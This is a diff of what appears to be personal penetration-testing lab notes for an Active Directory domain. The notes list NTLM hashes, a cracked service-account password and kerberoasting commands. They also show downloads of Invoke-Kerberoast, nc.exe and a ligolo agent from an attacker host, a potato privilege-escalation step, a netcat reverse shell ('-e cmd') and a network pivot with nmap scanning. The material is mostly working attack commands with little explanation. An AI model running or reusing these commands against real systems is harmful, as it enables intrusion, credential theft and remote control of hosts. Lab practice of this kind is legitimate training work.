@@ -132,9 +132,6 @@ Administrator
 17add237f30abaecc9d884f72958b928
 
 # kerberoast
-impacket-GetUserSPNs skylark.com/kiosk -hashes :92dd9eace3cf9ea33a95953aef6845ba -dc-ip 10.10.105.254 -request 
-impacket-GetUserSPNs skylark.com/Administrator -hashes :17add237f30abaecc9d884f72958b928 -dc-ip 10.10.105.254 -request
-
 # NOTE: need to be NT/authority system
 iwr -uri http://192.168.45.217:8000/Invoke-Kerberoast.ps1 -Outfile Invoke-Kerberoast.ps1
 powershell -ep bypass
@@ -148,6 +145,28 @@ iwr -uri http://192.168.45.217:8000/nc.exe -Outfile nc.exe
 .\efspotato.exe "whoami"
 .\efspotato.exe "nc.exe 192.168.45.217 7777 -e cmd"
 
+# backup_service: It4Server
+sudo hashcat -m 13100 backup.kerberoast /usr/share/wordlists/rockyou.txt --force
+```
+
+.221 pivot
+```
+# from kali
+sudo ip tuntap add user kali mode tun ligolo
+sudo ip link set ligolo up
+./proxy -selfcert
+# from proxy on kali
+>> session
+>> start
+
+# add route to internal network
+sudo ip route add 10.10.76.0/24 dev ligolo
+
+# from windows target
+iwr -uri http://192.168.45.217:8000/agent.exe -Outfile agent.exe
+./agent.exe -ignore-cert -connect 192.168.45.217:11601
+
+sudo nmap -p- -Pn 10.10.76.111 -sS -T 5 --verbose
 ```
 
 .222
